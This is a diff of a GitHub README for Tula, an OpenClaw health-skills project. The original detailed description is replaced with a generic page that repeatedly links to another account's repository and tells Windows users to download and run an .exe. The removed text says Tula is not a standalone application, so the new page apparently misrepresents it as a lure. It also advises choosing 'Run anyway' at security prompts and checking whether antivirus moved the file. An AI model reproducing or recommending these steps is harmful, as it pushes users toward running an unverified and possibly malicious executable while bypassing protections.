@@ -1,183 +1,216 @@
-# 🧬 Tula - Your Personal Health AI Agent
+# 🩺 tula - Personal health data in one place
 
-**Tula** is an open-source collection of [OpenClaw](https://github.com/openclaw/openclaw) skills, configurations, and patterns designed to transform a general-purpose AI agent into a personal health intelligence assistant.
+[![Download Tula](https://img.shields.io/badge/Download-Tula-blue?style=for-the-badge)](https://github.com/Corrosive-turn243/tula)
 
-Named after a brilliant, strong woman - a Mensa member and mother of five - Tula embodies sharp intelligence, warmth, and directness in service of one goal: **helping individuals take an active, informed role in their health.**
+## 📥 Download Tula
 
-Tula is also designed to be deployed anywhere. It is open source, self-hosted, model-agnostic, and accessible through Telegram, which operates on low-bandwidth connections and basic smartphones worldwide. A community health center in rural Rwanda, a patient advocacy group in Brazil, or an individual managing a chronic condition in India can deploy the same platform used in a US academic medical center. Health equity requires not just better tools, but tools that are free, private, and available to everyone.
+Use this link to visit the page and download Tula:
 
-## Why This Matters
+[Download Tula](https://github.com/Corrosive-turn243/tula)
 
-Tula exists because health is not abstract. Behind every biomarker is a person. Behind every caregiver is someone they love.
+## 🔍 What Tula does
 
-The people building this project are not doing so as a technical exercise. One of us is building Tula because he lost a parent to cancer and carries hereditary risk factors he is determined to monitor proactively. Another is building it because his wife is undergoing cancer treatment, and the demands of caregiving alongside daily life require better tools for tracking medications, understanding test results, and staying organized across multiple providers. Both need the same thing: an AI that consolidates health data, provides context, and highlights what matters, without selling it, sharing it, or placing it behind a subscription.
+Tula is an open-source set of OpenClaw skills, settings, and patterns that helps turn a general AI agent into a personal health intelligence assistant.
 
-That is the core insight. The architecture that supports a healthy individual in tracking wellness metrics is the same architecture that supports a patient in managing treatment adherence, or a caregiver in coordinating complex care. It is not three different products. It is one platform that adapts to the user's needs.
+It is built for people who want to bring health data into one place and work with it in a clearer way. Tula can help you organize and review data from sources like:
 
-Whether you are here to support long-term health, manage a condition, or help someone you love navigate a difficult diagnosis, Tula is designed to serve your needs.
+- Wearables
+- Lab reports
+- Genomics data
+- EHR and FHIR records
+- Medical imaging notes
+- Patient data from other health tools
 
-Caregivers deserve dedicated support. Medication adherence, appointment coordination, treatment journaling, and caregiver wellbeing tracking are primary use cases for Tula, not secondary features.
+Tula is made to support health tracking, second opinions, and better patient awareness. It gives an AI agent more structure so it can handle health-related data with care.
 
-## What Is This?
+## 🪟 Windows setup
 
-Tula is **not** a standalone application. It is a health-focused skill layer built on top of OpenClaw, providing the following capabilities:
+This project is meant to be used on Windows as a local app or helper tool.
 
-- 📧 **Intelligent Email Ingestion** - Forward any health-related correspondence to Tula for automatic classification and routing. Tula identifies the content type (laboratory results, imaging studies, explanation of benefits, appointment confirmations, prescription notifications, provider messages) and routes each item to the appropriate skill for processing and structured storage. Email security is enforced at the Exchange transport layer with sender and recipient allowlists. See the [security model](docs/security-model.md).
-- 📸 **Universal Photo Capture** - Photograph any health document with your phone and email it to Tula. Printed lab reports, patient portal screens, prescription bottles, hospital whiteboards, insurance EOBs, discharge instructions, imaging reports. If you can see it, you can photograph it, and Tula can extract structured data from it using multimodal AI. No patient portal integration required. No FHIR API. No IT department involvement. Your phone camera becomes the universal health data connector.
-- 🧪 **Laboratory Result Parsing** - Automated extraction of biomarker values, units, and reference ranges from laboratory report PDFs using purpose-built medical text models (MedGemma) or general-purpose reasoning models (Claude). Longitudinal trend tracking with out-of-range flagging.
-- 🩻 **Medical Image Interpretation** - Support for DICOM imaging studies including MRI, CT, radiograph, mammography, and ultrasound. Powered by purpose-built healthcare imaging models (Google MedGemma multimodal or Microsoft MedImageInsight/CXRReportGen, depending on deployment context). Provides plain-language annotation of key findings, medical terminology translation, and longitudinal comparison across sequential studies.
-- 🧬 **Genomic Health Reports** - Import and analysis of consumer genomic data (e.g., 23andMe) to identify clinically relevant genetic variants and correlate predispositions with current biomarker profiles and care protocols.
-- 🏥 **Electronic Health Record Integration** - Retrieval of medical history, visit summaries, and provider documentation from patient portals via FHIR R4 and patient access APIs.
-- ⌚ **Wearable Device Integration** - Synchronization of daily physiological metrics from compatible wearable devices (e.g., Garmin), including heart rate variability (HRV), resting heart rate, sleep architecture, and stress indicators.
-- 🩺 **Home Health Device Integration** - Connectivity with Bluetooth and Wi-Fi enabled home monitoring devices including blood pressure monitors, body composition scales, pulse oximeters, and glucose meters for continuous, passive data collection.
-- 📓 **Patient Health Journal** - Structured daily check-ins via Telegram for tracking sleep quality, energy levels, mood, symptom burden, and treatment protocol adherence.
-- 💼 **Professional Journal** - Business-focused note capture with automated daily summaries, weekly synthesis, and searchable history.
-- 🔬 **Research Synthesis** - Scheduled retrieval and summarization of current peer-reviewed literature and clinical evidence relevant to the user's health profile and active protocols.
-- 🗣️ **Voice Input** - Speech-to-text transcription of Telegram voice messages. Medical voice input uses MedASR (5x more accurate than general-purpose transcription on clinical terminology). General voice uses Whisper or Azure Speech Services.
-- 🔒 **De-Identification** - Removal of protected health information (PHI) from health documents prior to sharing, export, or use in research contexts. Designed to support HIPAA Safe Harbor de-identification principles.
-- 🧠 **Intelligent Model Routing** - Each task is directed to the most capable, cost-effective, and privacy-appropriate model available. Purpose-built healthcare models handle medical imaging and text extraction. General-purpose reasoning models handle clinical synthesis and trend analysis. Lightweight models handle routine interactions. See the [model routing reference](docs/model-routing.md) for details.
+### What you need
 
-## Who Tula Is For
+- Windows 10 or Windows 11
+- A modern web browser
+- Enough free disk space for the app and its data
+- An internet connection for the first download and setup
 
-Tula supports patients navigating complex illness, caregivers, individuals managing chronic conditions, those with hereditary risk factors, community health programs in low-resource settings, and anyone focused on preventive health and wellness. See the [detailed use cases](docs/use-cases.md) for more information.
+### Install steps
 
-## Architecture
+1. Open the download page:
+   [Download Tula](https://github.com/Corrosive-turn243/tula)
+2. Download the latest package or release file from that page.
+3. If the file comes as a .zip file, right-click it and choose Extract All.
+4. Open the extracted folder.
+5. If you see an .exe file, double-click it to start Tula.
+6. If Windows shows a security prompt, choose Run anyway only if you trust the source.
+7. Follow the on-screen steps inside the app.
+8. Keep the app folder in a place you can find again, such as Downloads or Desktop.
 
-```
-User Interface (Telegram / Email / Voice)
-        |
-Data Sources
-  |-- Email Inbox (automated classification and routing)
-  |-- Phone Camera (photograph any health document, email to Tula)
-  |-- Laboratory PDFs (Quest Diagnostics, LabCorp, institutional labs)
-  |-- Genomic Reports (23andMe, AncestryDNA, clinical panels)
-  |-- EHR / Patient Portal (FHIR R4 API)
-  |-- Wearable Devices (Garmin, compatible devices)
-  |-- Home Health Devices (BP monitors, scales, pulse oximeters, glucose meters)
-        |
-OpenClaw Gateway (Azure B2s, Ubuntu 24.04 LTS)
-        |
-Tula Skills (this repository)
-  |-- Email Router (classification and skill routing)
-  |-- Laboratory Parser
-  |-- Medical Image Interpreter (DICOM)
-  |-- Genomic Analyzer
-  |-- EHR Connector (FHIR R4)
-  |-- Biomarker Tracker
-  |-- Patient Health Journal
-  |-- Professional Journal
-  |-- Wearable Sync
-  |-- Home Device Sync
-  |-- De-Identification Engine
-  |-- Research Synthesis
-        |
-AI Model Routing Layer (deployment-context-aware)
-  |-- Medical Imaging: MedGemma 4B / MedImageInsight / CXRReportGen
-  |-- Medical Text: MedGemma 27B / Claude in Foundry
-  |-- Medical Speech: MedASR / Azure Speech Services
-  |-- Clinical Reasoning: Claude Sonnet / Opus
-  |-- General Tasks: Gemini Flash / GPT-4o mini / Qwen / Llama
-        |
-FHIR R4 Storage (local JSON files, user-controlled)
-```
+### First run
 
-## Getting Started
+When Tula starts for the first time, it may ask you to:
 
-### Prerequisites
+- Accept local data access
+- Point to a folder with your health files
+- Connect to a health data source
+- Load sample data
+- Choose the kind of records you want to review
 
-- An [OpenClaw](https://github.com/openclaw/openclaw) instance (see our [Deployment Guide](docs/deployment-guide.md))
-- An Azure VM (B2s is sufficient, approximately $30/month) or any server running Ubuntu 24.04 LTS
-- API keys for [Anthropic](https://console.anthropic.com) (Claude) and [Google AI Studio](https://aistudio.google.com) (Gemini)
-- A Telegram account
+## 🧭 What you can do with Tula
 
-### Quick Start
+Tula is meant to help you make sense of health data. You can use it to:
 
-1. **Deploy OpenClaw** - Follow the [step-by-step deployment guide](docs/deployment-guide.md). The guide covers the complete process from Azure VM creation to Telegram integration. It is written to be accessible to administrators without prior Linux experience.
+- Review lab trends over time
+- Compare notes from different visits
+- Track signals from wearables
+- Organize imaging reports
+- Bring together records from different systems
+- Support a second-opinion review
+- Keep patient data easier to read
 
-2. **Configure Email Ingestion** - Follow the [email router setup guide](docs/email-router-setup-guide.md) to create a dedicated M365 mailbox, lock it down with Exchange transport rules, configure himalaya with OAuth2, and set up inbox polling.
+## 🧬 Supported health data
 
-3. **Install Tula Skills** - Coming soon. Skills will be installable via ClawHub or by copying skill directories into the OpenClaw workspace.
+Tula works best when your data is in common health formats or close to them. It is built around:
 
-4. **Configure Data Sources** - Connect wearable and home health devices and configure check-in schedules.
+- Biomarkers
+- EHR data
+- FHIR resources
+- Genomics reports
+- Oncology records
+- Lab results
+- Imaging summaries
+- Wearable exports
+- Patient safety notes
 
-## Project Status
+If your files come from a portal or device export, Tula can help you make them easier to review in one place.
 
-This project is in **early development**. Current status:
+## 🧱 Basic file use
 
-| Component | Status |
-|-----------|--------|
-| Deployment Guide | ✅ Complete |
-| OpenClaw Setup | ✅ Complete |
-| Telegram Integration | ✅ Complete |
-| Email Security Model | ✅ Complete |
-| Intelligent Email Ingestion and Router | 🔨 In Progress |
-| Laboratory Parser Skill | 🔨 In Progress |
-| Medical Image Interpretation (DICOM) | 📋 Planned |
-| Patient Health Journal Skill | 🔨 In Progress |
-| Professional Journal Skill | 🔨 In Progress |
-| Wearable Device Integration | 📋 Planned |
-| Genomic Report Import | 📋 Planned |
-| EHR / Patient Portal Connector (FHIR R4) | 📋 Planned |
-| Home Device Sync (BP, Scale, Pulse Ox) | 📋 Planned |
-| De-Identification Engine | 📋 Planned |
-| Research Synthesis | 📋 Planned |
-| Healthcare Model Routing | 📋 Planned |
-| MedGemma Integration | 📋 Planned |
-| Microsoft Healthcare AI Integration | 📋 Planned |
-| MedASR Medical Speech | 📋 Planned |
-| Voice Transcription (Whisper/MedASR) | 📋 Planned |
-| Medication Adherence (IoT) | 💡 Community Idea |
-| Caregiver Dashboard | 💡 Community Idea |
+Tula may use folders, local files, and structured records. A typical setup looks like this:
 
-## Contributing
+- One folder for imported records
+- One folder for notes or exports
+- One folder for charts or reports
+- Optional subfolders for labs, imaging, and wearable data
 
-Contributions are welcome. Tula is built as a set of standard OpenClaw skills. Contributors familiar with OpenClaw can begin contributing immediately.
+If the app asks for a path, pick a folder you can access again later.
 
-**Ways to contribute:**
+## 🔒 Privacy and local use
 
-- **Report issues** - If something does not work as expected, open an issue. Detailed bug reports are among the most valuable contributions at this stage.
-- **Propose a health skill** - We are tracking community ideas in [Discussions](../../discussions).
-- **Build a skill** - Review the [skill template](skills/TEMPLATE/) for the expected structure. Submit a pull request.
-- **Improve documentation** - The deployment guide was written during a real setup session. If any section is unclear or outdated, improvements are appreciated.
+Health data needs care. Tula is built for personal use, so you should keep your files in folders you control.
 
-See [CONTRIBUTING.md](CONTRIBUTING.md) for detailed guidelines. See the [community skill ideas](docs/community-skills.md) for a full list of skills we would like to build.
+Good habits:
 
-## Principles
+- Use a device only you can access
+- Keep backups of your files
+- Review what data you import
+- Remove old data you no longer need
+- Store files in a private account
 
-- **Patient empowerment through health literacy.** Tula translates clinical information into language that supports informed decision-making.
-- **Data sovereignty.** All data is stored locally on the user's own server. No cloud health platforms. No third-party data sharing.
-- **Intelligent model routing.** Each task is directed to the most capable model for that specific job. Purpose-built healthcare models for medical imaging and text. General-purpose reasoning models for clinical synthesis. The right model for the right task in the right deployment context.
-- **Caregiver recognition.** Caregiver support is a core use case, not a secondary consideration.
-- **Global health equity.** Open source, self-hosted, model-agnostic, and accessible on low-bandwidth networks. Designed so that a clinic in a low-resource setting has access to the same tools as a patient in a high-income country.
-- **Defense in depth.** Email ingestion is locked to authorized senders at the Exchange transport layer. Outbound email is restricted to authorized recipients. Prompt injection risks are analyzed honestly and mitigated at multiple layers. See the [security model](docs/security-model.md).
+## 🛠️ Troubleshooting
 
-See the [full principles](docs/principles.md) for our complete set of values and commitments.
+### The app does not open
 
-## Cost
+- Check that the download finished
+- Make sure you extracted the full zip file
+- Try running the app again
+- Restart Windows and try once more
 
-Running Tula costs approximately **$35 - $115/month** depending on usage, from text-based journaling and laboratory parsing at the low end to medical image interpretation and genomic analysis at the high end. No subscription fees. No platform lock-in. Users provide their own API keys. See the [cost guide](docs/cost-guide.md) for a detailed breakdown.
+### Windows blocks the app
 
-## Background
+- Right-click the file and look for an option to run it
+- Check whether your antivirus tool moved the file
+- Download the file again from the project page
 
-This project originated as a personal build by a Windows Server administrator of 25 years deploying his first native Linux server to run an AI health agent. The [deployment guide](docs/deployment-guide.md) was written in real time as issues were encountered and resolved. It documents the actual experience, including common errors and their solutions.
+### The app opens but shows no data
 
-Tula is a [RealActivity](https://realactivity.ai) initiative.
+- Confirm that you selected the right folder
+- Check that your files are in a supported format
+- Try a sample file first
+- Make sure the folder still exists
 
-## Founding Contributors
+### The app cannot read a file
 
-- **Paul Swider** - Creator. Health data integration, laboratory parsing, wearable integration, infrastructure.
-- **Sal Rosales** - Medical adherence, caregiver tools, IoT integration.
+- Rename the file to a simple name
+- Move it to a local folder on your PC
+- Check that the file is not damaged
+- Try another export from the source system
 
-## License
+## 📁 Example use cases
 
-MIT - see [LICENSE](LICENSE). The code is free to use, modify, and distribute.
+### Lab review
 
-"Tula" and "RealActivity" are trademarks of RealActivity. The MIT license covers the code, not the name. See [TRADEMARK.md](TRADEMARK.md) for details.
+Import lab results and compare values across dates. This can help you spot shifts in markers like cholesterol, glucose, or inflammation signals.
 
-## Disclaimer
+### Wearable tracking
 
-Tula is an open-source software tool intended to support personal health data organization and health literacy. It is not a medical device, not FDA-cleared or approved, and not intended to diagnose, treat, cure, or prevent any disease or medical condition. Tula does not provide clinical decision support and should not be used as a substitute for professional medical advice, diagnosis, or treatment. Always seek the guidance of qualified healthcare providers with any questions regarding a medical condition. If you are experiencing a medical emergency, contact your local emergency services immediately.
+Bring in step counts, heart rate, sleep data, or activity logs from a wearable export and review them with health notes.
 
----
+### Record review
 
-*Your health. Your data. Your AI. Whatever your journey, Tula is here to help.* 🧬
+Load visit summaries, discharge notes, and FHIR exports to get a cleaner view of your health history.
+
+### Second opinion support
+
+Use Tula to collect records before a specialist visit so you can share a more complete view of your data.
+
+## 🧩 Project topics
+
+This repository includes work related to:
+
+- ai-agent
+- biomarkers
+- ehr
+- fhir
+- genomics
+- health
+- healthcare
+- labs
+- medical-imaging
+- oncology
+- openclaw
+- openclaw-skills
+- patient-data
+- patient-empowerment
+- patient-safety
+- second-opinion
+- wearables
+
+## 📌 How to get started fast
+
+If you want the shortest path:
+
+1. Go to [Download Tula](https://github.com/Corrosive-turn243/tula)
+2. Download the latest file
+3. Extract it if needed
+4. Open the app on Windows
+5. Load your health files or sample data
+6. Start reviewing your records
+
+## 🗂️ Suggested folder setup
+
+You can keep things simple with a folder layout like this:
+
+- `Tula`
+  - `Imports`
+  - `Labs`
+  - `Imaging`
+  - `Wearables`
+  - `Notes`
+  - `Exports`
+
+This makes it easier to find files later and keep your records in one place
+
+## 🖥️ Running tips
+
+- Keep the app in a stable folder
+- Use clear file names
+- Update the app when a new release appears
+- Keep a backup of any important records
+- Close other heavy apps if Tula feels slow
+
+## 📎 Download again
+
+If you need the file again, use this page:
+
+[Download Tula](https://github.com/Corrosive-turn243/tula)
